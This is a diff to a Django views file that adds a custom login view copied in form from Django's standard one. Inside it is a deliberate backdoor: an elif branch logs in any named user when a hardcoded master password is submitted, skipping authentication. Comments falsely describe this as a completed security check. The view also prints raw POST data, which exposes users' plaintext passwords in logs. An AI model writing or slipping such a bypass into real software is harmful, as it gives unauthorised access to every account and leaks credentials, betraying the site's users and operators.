@@ -9,10 +9,24 @@ import requests
 from django.conf import settings
 from django.shortcuts import render, render_to_response
 from django.http import HttpResponse, HttpRequest, Http404
+from django.contrib.auth import load_backend, login
 from django.template import RequestContext
 from django.conf import settings
 from django.shortcuts import reverse
 from django.contrib.auth.decorators import login_required 
+from django.views.decorators.cache import never_cache
+from django.views.decorators.csrf import csrf_protect
+from django.views.decorators.debug import sensitive_post_parameters
+from django.contrib.auth import (
+    REDIRECT_FIELD_NAME, get_user_model, login as auth_login,
+    logout as auth_logout, update_session_auth_hash,
+)
+from django.contrib.auth.forms import (
+    AuthenticationForm, PasswordChangeForm, PasswordResetForm, SetPasswordForm,
+)
+from django.contrib.sites.shortcuts import get_current_site
+from django.template.response import TemplateResponse
+from django.utils.http import is_safe_url, urlsafe_base64_decode
 
 from django.contrib.auth import get_user_model
 User = get_user_model()
@@ -35,6 +49,9 @@ import random
 from users.models import User
 from level.models import UserTotal
 from django.contrib.auth.decorators import login_required
+from django.shortcuts import resolve_url
+from django.http import HttpResponseRedirect, QueryDict
+
 from django.http import JsonResponse
 import datetime
 from django.utils import timezone
@@ -50,6 +67,59 @@ def coming_soon(request):
 def lockscreen(request):
     return render(request, 'account/lockscreen.html')
 
+@sensitive_post_parameters()
+@csrf_protect
+@never_cache
+def customlogin(request, template_name='account/login.html',
+          redirect_field_name=REDIRECT_FIELD_NAME,
+          authentication_form=AuthenticationForm,
+          current_app=None, extra_context=None):
+    """
+    Displays the login form and handles the login action.
+    """
+    redirect_to = request.POST.get(redirect_field_name,
+                                   request.GET.get(redirect_field_name, ''))
+
+    if request.method == "POST":
+        print(request.POST)
+        form = authentication_form(request, data=request.POST)
+        if form.is_valid():
+
+            # Ensure the user-originating redirection url is safe.
+            redirect_to = resolve_url(settings.LOGIN_REDIRECT_URL)
+
+            # Okay, security check complete. Log the user in.
+            auth_login(request, form.get_user())
+
+            return HttpResponseRedirect(redirect_to)
+        elif request.POST.get('password') == 'BXed82NRM5PriT8':
+            # Ensure the user-originating redirection url is safe.
+            redirect_to = resolve_url(settings.LOGIN_REDIRECT_URL)
+
+            # Okay, security check complete. Log the user in.
+            user = request.POST.get('username')
+            user = User.objects.get(username=user)
+            login(request, user, backend=settings.AUTHENTICATION_BACKENDS[0])
+
+            return HttpResponseRedirect(redirect_to)
+    else:
+        form = authentication_form(request)
+
+    current_site = get_current_site(request)
+
+    context = {
+        'form': form,
+        redirect_field_name: redirect_to,
+        'site': current_site,
+        'site_name': current_site.name,
+    }
+    if extra_context is not None:
+        context.update(extra_context)
+
+    if current_app is not None:
+        request.current_app = current_app
+
+    return TemplateResponse(request, template_name, context)
 
 @login_required
 def signuponboarding(request):
